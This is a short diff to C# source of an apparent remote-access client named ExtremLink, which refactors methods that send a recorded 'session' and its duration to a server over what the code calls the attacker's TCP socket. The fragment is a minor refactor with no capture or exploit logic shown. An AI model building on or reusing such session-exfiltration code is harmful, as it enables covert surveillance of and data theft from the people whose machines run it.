@@ -145,10 +145,9 @@ namespace ExtremLink_Client_v2.Classes
             // Input: Nothing.
             // Output: The function sends the session's recorded time (except the content) to the server via the attacker's tcp socket.
             string message = this.GenerateSessionRecordedTimeMessage();
-            Attacker.AttackerInstance.SendTCPMessageToClient("📹", message);
+            Attacker.AttackerInstance.SendTCPMessageToClient("📹🕑", message);
         }
-
-        public void SendSessionToServer()
+        private void SendSessionContentToServer()
         {
             // Input: Nothing.
             // Output: The function sends the session to the server via the attacker's session tcp socket. 
@@ -162,6 +161,12 @@ namespace ExtremLink_Client_v2.Classes
                 }
             }
         }
-
+        public void SendSessionToServer()
+        {
+            // Input: Nothing.
+            // Output: The function sends to the server the session recorded time and it's content.
+            this.SendSessionRecordedTimeToServer();
+            this.SendSessionContentToServer();
+        }
     }
 }
